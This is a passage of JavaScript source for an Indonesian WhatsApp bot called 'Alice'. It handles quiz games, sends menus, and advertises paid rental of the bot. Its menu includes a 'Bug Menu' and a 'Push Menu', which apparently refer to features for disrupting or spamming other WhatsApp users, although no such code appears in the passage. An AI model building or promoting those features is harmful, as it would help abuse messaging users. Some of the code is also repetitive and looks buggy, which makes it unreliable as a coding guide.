					db.data.users[m.sender].uang += susunkata[m.chat][2]
					JwbTrue("Susun Kata", susunkata[m.chat][2], `\n\nKirim perintah .susunkata\nuntuk bermain lagi 🎮`)
					clearTimeout(susunkata[m.chat][3])
					delete susunkata[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkalimat[m.chat][2]
					JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2], `\n\nKirim perintah .tebakkalimat\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkalimat[m.chat][3])
					delete tebakkalimat[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (siapaaku[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == siapaaku[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += siapaaku[m.chat][2]
					JwbTrue("Tebak Siapa", siapaaku[m.chat][2], `\n\nKirim perintah .tebaksiapa\nuntuk bermain lagi 🎮`)
					clearTimeout(siapaaku[m.chat][3])
					delete siapaaku[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tekateki[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tekateki[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tekateki[m.chat][2]
					JwbTrue("Teka Teki", tekateki[m.chat][2], `\n\nKirim perintah .tekateki\nuntuk bermain lagi 🎮`)
					clearTimeout(tekateki[m.chat][3])
					delete tekateki[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebakkimia[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
				jawaban = json.unsur.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkimia[m.chat][2]
					JwbTrue("Teka Kimia", tebakkimia[m.chat][2], `\n\nKirim perintah .tebakkimia\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkimia[m.chat][3])
					delete tebakkimia[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebaklirik[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebaklirik[m.chat][2]
					JwbTrue("Teka Lirik", tebaklirik[m.chat][2], `\n\nKirim perintah .tebaklirik\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaklirik[m.chat][3])
					delete tebaklirik[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebaktebakan[m.chat][2]
					JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2], `\n\nKirim perintah .tebaktebakan\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaktebakan[m.chat][3])
					delete tebaktebakan[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					ReplyRynzz(`_Ya, Dikit Lagi!_`)
				else reactionMessage('❌');
			}
		}

		async function cekgame(gamejid) {
			if (tekateki[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tekateki[gamejid][0]
				})
				return true
			} else if (caklontong[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: caklontong[gamejid][0]
				})
				return true
			} else if (susunkata[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: susunkata[gamejid][0]
				})
				return true
			} else if (mathgame[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Soal Mathgame belum selesai"
				}, {
					quoted: mathgame[gamejid][0]
				})
				return true
			} else if (tebaktebakan[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebaktebakan[gamejid][0]
				})
				return true
			} else if (tebaklirik[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebaklirik[gamejid][0]
				})
				return true
			} else if (tebakkimia[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakkimia[gamejid][0]
				})
				return true
			} else if (siapaaku[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: siapaaku[gamejid][0]
				})
				return true
			} else if (tebakkalimat[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakkalimat[gamejid][0]
				})
				return true
			} else if (tebakbendera[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakbendera[gamejid][0]
				})
				return true
			} else if (tebakkata[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakkata[gamejid][0]
				})
				return true
			} else if (asahotak[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: asahotak[gamejid][0]
				})
				return true
			} else if (lengkapikalimat[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: lengkapikalimat[gamejid][0]
				})
				return true
			} else if (tebakgame[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakgame[gamejid][0]
				})
				return true
			} else if (tebakhero[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakhero[gamejid][0]
				})
				return true
			} else if (tebakff[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakff[gamejid][0]
				})
				return true
			} else if (tebakhewan[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakhewan[gamejid][0]
				})
				return true
			} else if (tebakml[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakml[gamejid][0]
				})
				return true
			} else if (tebakchara[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakchara[gamejid][0]
				})
				return true
			} else if (tebaklogo[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebaklogo[gamejid][0]
				})
				return true
			} else if (tebakaplikasi[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakaplikasi[gamejid][0]
				})
				return true
			} else if (tebakgambar[gamejid]) {
				Alice.sendMessage(gamejid, {
					text: "Selesaikan soal ini terlebih dahulu"
				}, {
					quoted: tebakgambar[gamejid][0]
				})
				return true
			} else {
				return false
			}
		}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

function formatmoney(amount, options = {}) {
  const {
    currency = "IDR",
    locale = "id",
    minimumFractionDigits = 0,
    maximumFractionDigits = 0,
    useSymbol = true
  } = options;

  const formattedAmount = amount.toLocaleString(locale, {
    style: "currency",
    currency,
    minimumFractionDigits,
    maximumFractionDigits,
  });

  return useSymbol ? formattedAmount : formattedAmount.replace(/[^\d.,]/g, '');
}

async (source, filename, options) => {
      try {
         if (Buffer.isBuffer(source)) {
            let ext, mime
            try {
               mime = await (await fromBuffer(source)).mime
               ext = await (await fromBuffer(source)).ext
            } catch {
               mime = require('mime-types').lookup(filename ? filename.split`.` [filename.split`.`.length - 1] : 'txt')
               ext = require('mime-types').extension(mime)
            }
            const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : ext
            const size = Buffer.byteLength(source)
            const filepath = 'temp/' + (this.uuid() + '.' + ext)
            const file = fs.writeFileSync(filepath, source)
            const name = filename || path.basename(filepath)
            return new Promise(resolve => {
               const data = {
                  status: true,
                  file: filepath,
                  filename: name,
                  mime: mime,
                  extension: ext,
                  size: this.formatSize(size),
                  bytes: size
               }
               return resolve(data)
            })
         } else if (source.startsWith('./') || source.startsWith('/')) {
            const mime = require('mime-types').lookup(filename ? filename.split`.` [filename.split`.`.length - 1] : source.split`.` [source.split`.`.length - 1])
            const ext = require('mime-types').extension(mime)
            const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : ext
            const size = fs.statSync(source).size
            const name = filename || path.basename(source)
            return new Promise(resolve => {
               const data = {
                  status: true,
                  file: source,
                  filename: name,
                  mime: mime,
                  extension: ext,
                  size: this.formatSize(size),
                  bytes: size
               }
               return resolve(data)
            })
         } else {
            return new Promise(resolve => {
               const mg = new Miniget(source, {
                  headers: {
                     "Accept": "*/*",
                     "User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
                     "Referrer-Policy": "strict-origin-when-cross-origin",
                     "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                     "sec-ch-ua-platform": "Android",
                     "sec-fetch-dest": "empty",
                     "sec-fetch-mode": "cors",
                     "sec-fetch-site": "same-origin",
                     ...options
                  }
               })
               mg.on('response', (response) => {
                  if (response.statusCode !== 200) {
                     resolve({
                        status: false,
                        msg: `[${response.statusCode}] : Error while gwtting file`
                     })
                     return
                  }
                  const extension = filename ? filename.split`.` [filename.split`.`.length - 1] : mime.extension(response.headers['content-type'])
                  const file = fs.createWriteStream(`temp/${this.uuid() + '.' + extension}`)
                  const name = filename || path.basename(file.path)
                  const transformStream = new stream.Transform({
                     transform(chunk, encoding, callback) {
                        callback(null, chunk)
                     }
                  })
                  mg.pipe(transformStream).pipe(file)
                  file.on('finish', () => {
                     const data = {
                        status: true,
                        file: file.path,
                        filename: name,
                        mime: mime.lookup(file.path),
                        extension: extension,
                        size: this.formatSize(response.headers['content-length'] ? response.headers['content-length'] : 0),
                        bytes: response.headers['content-length'] ? parseInt(response.headers['content-length']) : 0,
                        headers: response.headers
                     }
                     resolve(data)
                  })
                  .on('error', (error) => {
                     resolve({
                        status: false,
                        msg: `Error when getting the file`
                     })
                  })
               })
            })
         }
      } catch (e) {
         return ({
            status: false,
            msg: e.message
         })
      }
   }

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Only Group
if (!m.isGroup && !isOwner && !isPrem && db.data.settings[botNumber].onlygrub ) {
	if (command){
return ReplyRynzz(`Hai ${m.pushName}, Karena Kami Ingin Mengurangi Spam Terhadap Bot, Silahkan Gunakan Bot ${botname} Di Group Chat, Atau Buy Premium/Sewa Untuk Mendapatkan Akses User Premium Dan Dapat Digunakan Di Private Chat!\n\nLink Group Bot: ${groupbot} !`)
}
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Mute Group
if (m.isGroup && isMute) {
if (!isOwner) return
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Command No Prefix
//————————————————————————////————————————————————————//

if (m.isGroup) {
    if (body.includes(`@${owner}`)) {
        reaction(m.chat, "❌")
    }
 }

if ((budy.match) && ["ap", "Y", "y", "o", "O", "?",].includes(budy) && !isCmd) {
Alice.sendMessage(m.chat, { audio: { url: soundcool }, mimetype: 'audio/mpeg' }, { quoted: m })
}

// Runtime Command No Prefix
if ((budy.match) && ["runtime",].includes(budy) && !isCmd) {
ReplyRynzz(`${botname}\nRuntime : ${runtime(process.uptime())}\ `)
}		

// Tes Command No Prefix		
if ((budy.match) && ["tes",].includes(budy) && !isCmd) {
ReplyRynzz(`${botname} A WhatsApp Bot`)
}	

// Toxic
if ((budy.match) && ["babi", "kntl", "kontol", "bujang", "mmq", "mmk", "memek", "iclik", "ktl", "anjing", "anj",].includes(budy)) {
ReplyRynzz(`
*مَا شَيْءٌ أَثْقَلُ فِيْ مِيْزَانِ الْمُؤْمِنِ يَوْمَ الْقِيَامَةِ مِنْ خُلُقٍ حَسَنٍ وَإِنَّ اللهَ لَيُبْغِضُ الْفَاحِشَ الْبَذِيْءَ*

_“Sesungguhnya tidak ada sesuatu apapun yang paling berat ditimbangan kebaikan seorang mu’min pada hari kiamat seperti akhlaq yang mulia, dan sungguh-sungguh (benar-benar) Allāh benci dengan orang yang lisānnya kotor dan kasar.”_

\`jangan toxic lagi ya kak\` *@${pushname}* ☺`)
}

// Sepuh Command No Prefix With Ptv 
if ((budy.match) && ["sepuh", "Sepuh", "puh", "Puh"].includes(budy) && !isCmd) {
 let msg = await generateWAMessageContent({
 video: { url: 'https://telegra.ph/file/2ff6d0005fc4a32f67f65.mp4' }
 }, {
 upload: Alice.waUploadToServer
 })
 let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m })
 await Alice.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} 

 
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
switch(command) {
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// All Fitur Case Di Bawah ↓
case 'listmenu':
case 'menu': {
let ciro = `🪸 i am an automated system ( WhatsApp bot ) that can help to do something search and get data or information only through WhatsApp

*— Informations*
Version: ${version}
Totalfitur : ${totalfitur()}
Developer: ${ownername}
Botname: ${botname}
Baileys: ${baileys}`

const xyro = {
title: "selected",
sections: [
{
title: `All Feature`, 
highlight_label: `All Command`,
rows: [
{
title: "All Menu ✨",
description: "Display All Feature ✨",
id: `${Xyroo}allmenu`,
},
]},
{
title: `Menu Diutamakan`, 
highlight_label: ``,
rows: [
{
title: "Premium Menu 😚",
description: "Display Feature For User Premium vip",
id: `${Xyroo}premiummenu`, 
},
{
title: "Owner Menu 🥳",
description: "Display Feature Untuk Owner VVIP ✨",
id: `${Xyroo}ownermenu`,
},
]},
{
title: `Menu Lainnya Dibawah Ini`, 
highlight_label: `List Menu`,
rows: [
{
title: "Group Menu 😗",
description: "Menampilkan Menu Group",
id: `${Xyroo}groupmenu`, 
},
{
title: "Game Menu 🎮",
description: "Menampilkan Menu Game",
id: `${Xyroo}gamemenu`, 
},
{
title: "Rpg Menu 🎲",
description: "Menampilkan Menu Rpg",
id: `${Xyroo}rpgmenu`, 
},
{
title: "Ai Menu 🤖",
description: "Menampilkan Menu Ai",
id: `${Xyroo}aimenu`, 
},
{
title: "Push Menu 🎗",
description: "Menampilkan Menu Push",
id: `${Xyroo}pushmenu`, 
},
{
title: "Audio Menu 🎧",
description: "Menampilkan Menu Audio",
id: `${Xyroo}audiomenu`, 
},
{
title: "Ephoto Menu 📷",
description: "Menampilkan Menu Ephoto",
id: `${Xyroo}ephotomenu`, 
},
{
title: "Store Menu 💲",
description: "Menampilkan Menu Store",
id: `${Xyroo}storemenu`, 
},
{
title: "Main Menu 🌛",
description: "Menampilkan Menu Main",
id: `${Xyroo}mainmenu`, 
},
{
title: "Tools Menu 🔧",
description: "Menampilkan Menu Tools",
id: `${Xyroo}toolsmenu`, 
},
{
title: "Search Menu 🔎",
description: "Menampilkan Menu Search",
id: `${Xyroo}searchmenu`, 
},
{
title: "Random Menu ⚡",
description: "Menampilkan Menu Random",
id: `${Xyroo}randommenu`, 
},
{
title: "Asupan Menu 👄",
description: "Menampilkan Menu Asupan",
id: `${Xyroo}asupanmenu`, 
},
{
title: "Anonymous Menu 👿",
description: "Menampilkan Menu Anonymous",
id: `${Xyroo}anonymousmenu`, 
},
{
title: "Islami Menu 🕌",
description: "Menampilkan Menu Islami",
id: `${Xyroo}islamimenu`, 
},
{
title: "Berita Menu 📺",
description: "Menampilkan Menu Berita",
id: `${Xyroo}beritamenu`, 
},
{
title: "Primbon Menu ⌛",
description: "Menampilkan Menu Primbon",
id: `${Xyroo}primbonmenu`, 
},
{
title: "Convert Menu 🗳",
description: "Menampilkan Menu Convert",
id: `${Xyroo}convertmenu`, 
},
{
title: "Panel Menu 🎗",
description: "Menampilkan Menu Panel",
id: `${Xyroo}cpanelmenu`, 
},
{
title: "Bug Menu 💀",
description: "Menampilkan Menu Bug",
id: `${Xyroo}bugmenu`, 
},
{
title: "Download Menu ⏳",
description: "Menampilkan Menu Download",
id: `${Xyroo}downloadermenu`,
},
]},
{
title: `Information`, 
highlight_label: ``,
rows: [
{
title: "Sewabot",
description: "List Price Sewabot",
id: `${Xyroo}menubuysewa`,
},
{
title: "Source Code",
description: `Source Code ${botname}`,
id: `${Xyroo}sc`,
},
]},
]};
xreplyx(m.chat, ciro, xyro, xy);
}
break

case 'menubuysewa':
case 'buysewa':
case 'sewabot': {
let teks = `
*SEWABOT ALICE ASISTENT*

— Preview
- Hidetag
- Jagagroup ( Antilink 35+ )
- Warning fitur
- Search Features
- Downloader
- Rpg
- Smeme
- Sticker
- Sticker Brat
- Sticker Bratvideo
- Kick member
- Add member
- Toadmin
- Tomember
- Dll..

— Price List
1 Week: IDR 10,000
2 Weeks: IDR 15,000
1 Month: IDR 20,000
2 Months: IDR 27,000
Permanent/Unlimited: IDR 35,000

— Benefit?
Sc pribadi
Bot On 24 jam
Akses Fitur Premium
Akses Bot Full 24jam
Gunakan Bot Sepuasnya
Akses Bot Di Private Chat
Downloader Sosial Media Sepuasnya
Unlimited Limit ( Sesuai Durasi Sewa )
Mendapatkan Garansi Ketika Bot Kenon/Kebanned
Dan Masih Banyak Lagi

— Buy? Pv
https://wa.me/6281543496975
https://t.me/XyrooRynzz`

const bet = {
title: "Click Disini",
sections: [
{
title: `Sewa`, 
highlight_label: `sewabot`,
rows: [
{
title: "1 Minggu 🌟",
description: "Duration: 1 Week",
id: `${Xyroo}buysewa-1minggu`,
},
{
title: "2 Minggu 🌟🌟",
description: "Duration: 2 Week",
id: `${Xyroo}buysewa-2minggu`, 
},
{
title: "1 Bulan 🌟🌟🌟",
description: "Duration: 1 Months",
id: `${Xyroo}buysewa-1bulan`,
},
{
title: "2 Bulan 🌟🌟🌟🌟",
description: "Duration: 2 Months",
id: `${Xyroo}buysewa-2bulan`,
},
{
title: "Permanent 🌟🌟🌟🌟🌟",
description: "Duration: Permanent",
id: `${Xyroo}buysewa-permanen`,
},
]},
]};
xreplyx(m.chat, teks, bet, m);
}
break

case "allmenu": 
const Aliceall = `${global.allmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceall,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "cpanelmenu": 
let Alicecpanel = `${global.cpanelmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicecpanel,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "bugmenu": 
let Alicebug = `${global.bugmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicebug,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "pushmenu": 
const Alicep = `${global.pushmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicep,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "mainmenu": 
const Alicem = `${global.mainmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicem,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "beritamenu": 
const Aliceb = `${global.beritamenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceb,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "asupanmenu": 
const Alicea = `${global.asupanmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicea,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "audiomenu": 
const Aliceau = `${global.audiomenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceau,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "anonymousmenu": 
const Alicean = `${global.anonymousmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicean,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "aimenu": 
const Aliceai = `${global.aimenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Aliceai,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "storemenu": 
const Alices = `${global.storemenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alices,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "convertmenu": 
const Alicecon = `${global.convertmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
    jpegThumbnail: fs.readFileSync("./AliceMedia/image/Alice.png"), 
    contextInfo: {
        mentionedJid: [m.sender], 
        isForwarded: true,
        externalAdReply: {
        title: hariini, 
        body: packname, 
        thumbnailUrl: thumb,
        sourceUrl: ig,
       mediaType: 1,
        renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: idch,
            serverMessageId: null,
            newsletterName: botname
        },
    },
    caption: Alicecon,
  buttons:  [
  {
    buttonId: `${prefix}menu`,
    buttonText: { displayText: 'List Menu' }
  }
],
  headerType: 1,
  viewOnce: true
}, {})
break

case "toolsmenu": 
const Alicet = `${global.toolsmenu}`
Alice.sendMessage(m.chat, {
    document: fs.readFileSync("./AliceZuberg.txt"),
    fileName: botname,
    mimetype: 'image/png',
